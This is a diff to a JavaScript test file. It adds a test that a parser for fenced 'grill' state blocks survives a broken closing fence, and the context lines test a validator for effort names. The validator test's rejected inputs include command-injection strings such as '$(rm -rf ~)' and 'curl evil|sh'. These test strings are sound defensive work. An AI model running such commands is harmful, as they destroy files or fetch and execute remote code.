@@ -69,3 +69,13 @@ test('effort name rule: letters/digits/space/._- , 1–60 chars, starts alphanum
   for (const bad of ['', ' x', '.x', '-x', 'x"y', "x'y", '$(rm -rf ~)', 'a`b`', 'a\nb', 'a;b', 'a/b', 'A'.repeat(61), '🔥 x', undefined, 'foo ']) assert.equal(isValidEffort(bad), false, String(bad));
   assert.throws(() => checkEffort('x"; curl evil|sh; "'), (/** @type {any} */ e) => e.exitCode === 2 && e.message.includes(EFFORT_RULE));
 });
+
+test('a glued or deleted closing fence cannot swallow a later appended block', () => {
+  const old = '```grill\n{"v":1,"owner":"o_aaaaaa","gen":1,"round":0}\n';
+  const fresh = writeBlock('', { v: 1, owner: 'o_bbbbbb', gen: 2, round: 0 });
+  for (const broken of [`p\n\n${old}\`\`\`thanks`, `p\n\n${old}`]) {
+    const r = readBlock(broken + fresh);
+    assert.equal(r.state?.owner, 'o_bbbbbb', JSON.stringify(broken));
+    assert.equal(r.state?.gen, 2);
+  }
+});
